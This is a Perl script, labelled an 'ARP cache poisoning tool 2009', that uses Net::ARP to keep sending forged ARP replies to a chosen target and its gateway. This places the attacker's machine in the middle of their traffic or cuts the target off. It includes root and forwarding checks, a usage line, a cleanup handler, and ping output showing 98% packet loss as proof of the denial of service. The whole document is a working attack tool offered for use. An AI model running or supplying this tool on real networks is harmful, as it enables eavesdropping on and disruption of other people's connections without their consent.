#!/usr/bin/perl
use Net::ARP;
use strict;
use warnings;
our $VERSION = '0.1.8';
$SIG{INT} = \&interrupt;

#######################################
### BMN ARP Cache Poison && ARP DOS ###
#######################################

## ex. perl arp-cache-poison.pl eth0 10.0.0.8 10.0.0.1 10.0.0.4

my $GID = $(;
die "$0 must be run as root!\n" if( $GID != 0 );

my $forward = `sysctl -a 2>/dev/null | grep net.ipv4.conf.eth0.forwarding`;
$forward =~ s/\s*//g;
die "Enable ipv4 forwarding in your kernel!\n" 
 if((split(/=/,$forward))[1] != 1);

die "Usage: perl $0 <device> <target> <gateway> <localhost>\n" if @ARGV != 4;
title();
my ($dev, $target, $gateway, $localHost) = @ARGV[0 .. 3];
my $targetMac = Net::ARP::arp_lookup("$dev","$target");
my $gatewayMac = Net::ARP::arp_lookup("$dev","$gateway");
my $ourMac = Net::ARP::get_mac("$dev");

my @children;

my $targetProc = fork();
if($targetProc){push(@children,$targetProc)}
elsif($targetProc==0){
 poisonTarget();
 exit 0;
 }
else{warn "Couldnt fork: $!"}

my $gatewayProc = fork();
if($gatewayProc){push(@children,$gatewayProc)}
elsif($gatewayProc==0){
 poisonGateway();
 exit 0;
 }
else{warn "Couldnt fork: $!"}


foreach (@children){
waitpid($_, 0);
}

sub poisonTarget{
title(1);
while(1){
Net::ARP::send_packet(  $dev,
						$gateway,
						$target,
						$ourMac,
						$targetMac,
						'reply',
					 );			
 sleep 1;	
 }
}

sub poisonGateway{
while(1){
Net::ARP::send_packet(  $dev,
						$target,
						$gateway,
						$ourMac,
						$gatewayMac,
						'reply',
					 );			
 sleep 1;	
 }
}

sub title{
system("clear");
if($^O =~ /win/i){system("cls") }
print "\n\n". "~" x 62 . "\n";
printf("%6s %-30s %-6s\n", "[+]", "ARP cache poisoning tool 2009", "[+]");
print "~" x 62 . "\n\n\n";
printf("%6s %-30s %-12s\n\n\n\n\n\n", "[+]", "Poisoning cache on $target", "[+]") if($_[0]);
}


sub interrupt{
print "Process $$ has trapped a kill signal! Cleaning up with grace...\n";
for(1..5){
 Net::ARP::send_packet(  $dev,
						$gateway,
						$target,
						$gatewayMac,
						$targetMac,
						'reply',
					 );		

 Net::ARP::send_packet(  $dev,
						$target,
						$gateway,
						$targetMac,
						$gatewayMac,
						'reply',
					 );		
 sleep 1;
 }
die "Terminating process $$\n";
}

__END__

----------------------------------

Includes initial packet before ARP DOS begins

$ ping -c 100 google.com
PING google.com (74.125.127.100) 56(84) bytes of data.
64 bytes from pz-in-f100.google.com (74.125.127.100): icmp_seq=1 ttl=244 time=42.5 ms
64 bytes from pz-in-f100.google.com (74.125.127.100): icmp_seq=52 ttl=244 time=39.7 ms

--- google.com ping statistics ---
100 packets transmitted, 2 received, 98% packet loss, time 99008ms
